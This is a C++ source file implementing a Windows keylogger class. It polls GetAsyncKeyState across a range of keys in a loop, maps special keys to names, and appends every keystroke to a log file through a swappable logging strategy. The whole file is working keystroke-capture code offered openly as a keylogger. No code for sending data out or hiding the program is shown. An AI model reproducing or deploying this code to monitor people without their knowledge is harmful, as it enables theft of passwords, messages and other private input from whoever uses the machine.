
#ifdef _WIN32

#include "../include/KeyLogger.h"
#include <iostream>

KeyLogger::KeyLogger() : 
        logStrategy(nullptr),
        running(false) {}

KeyLogger::~KeyLogger() 
{
    stop();

    delete logStrategy;
}

void KeyLogger::setLogStrategy(LogStrategy* strategy)
{
    this->logStrategy = strategy;
}

bool KeyLogger::openLogFile(const std::string &filename)
{
    this->logfile.open(filename, std::ios::app);
    return this->logfile.is_open();
}

void KeyLogger::logKey(char key) 
{
    // Ensure a logging strategy is set
    if (logStrategy == nullptr) 
    {
        std::cerr << "No strategy implemented!" << std::endl;
        exit(EXIT_FAILURE);
    }

    // Convert the character to its corresponding virtual key int
    int virtualKey = static_cast<int>(key);

    // Check if the virtual key corresponds to a special key
    auto it = keyname.find(virtualKey);

    if (it != keyname.end())
    {
        // Special key found so log its string representation
        logStrategy->log(it->second, logfile);
    }
    else
    {
        // Not a special key, bassically just log it
        logStrategy->log(std::string(1, key), logfile);
    }
}


void KeyLogger::start()
{
    running = true;
    char key;

    while(running)
    {
        for(key = START_KEY; key <= END_KEY; ++key)
        {
            if(GetAsyncKeyState(key) == IS_PRESSED)
            {
                this->logKey(key);
            }
        }
        Sleep(PAUSE); // reduce CPU usage
    }
}

void KeyLogger::stop()
{
    if(this->isRunning())
    {
        running = false;
    }
    if (logfile.is_open())
    {
        logfile.close();
    }
}

bool KeyLogger::isRunning() const
{
    return this->running;
}

#endif
